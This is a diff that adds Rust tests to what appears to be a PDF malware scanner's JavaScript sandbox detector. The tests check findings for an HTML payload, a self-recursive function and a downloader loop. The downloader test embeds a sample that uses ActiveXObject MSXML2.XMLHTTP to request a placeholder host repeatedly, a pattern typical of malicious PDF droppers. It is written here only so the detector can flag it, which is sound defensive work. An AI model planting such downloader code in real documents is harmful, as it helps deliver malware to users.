@@ -166,3 +166,55 @@ fn sandbox_emits_emulation_breakpoint_finding_for_runtime_errors() {
         .map(|value| value.contains("expected token"))
         .unwrap_or(false));
 }
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_payload_format_mismatch_for_markup_payloads() {
+    let bytes = build_minimal_js_pdf("<html><body>not-js</body></html>");
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_payload_non_javascript_format")
+        .expect("js_payload_non_javascript_format finding");
+    assert_eq!(finding.meta.get("js.payload.format_hint").map(String::as_str), Some("html_markup"));
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_recursion_limit_finding_for_recursive_payload() {
+    let bytes = build_minimal_js_pdf("function f\\(\\)\\{f\\(\\);\\}f\\(\\);");
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_recursion_limit")
+        .expect("js_runtime_recursion_limit finding");
+    assert_eq!(finding.meta.get("js.runtime.recursion_limit_hits").map(String::as_str), Some("1"));
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_downloader_loop_pattern_finding() {
+    let payload = "for(var i=0;i<2;i++){var x=new ActiveXObject('MSXML2.XMLHTTP');x.Open('GET','http://example.test',false);x.Send();}";
+    let bytes = build_minimal_js_pdf(payload);
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_downloader_pattern")
+        .expect("js_runtime_downloader_pattern finding");
+    assert_eq!(finding.meta.get("js.runtime.downloader.open_calls").map(String::as_str), Some("2"));
+}
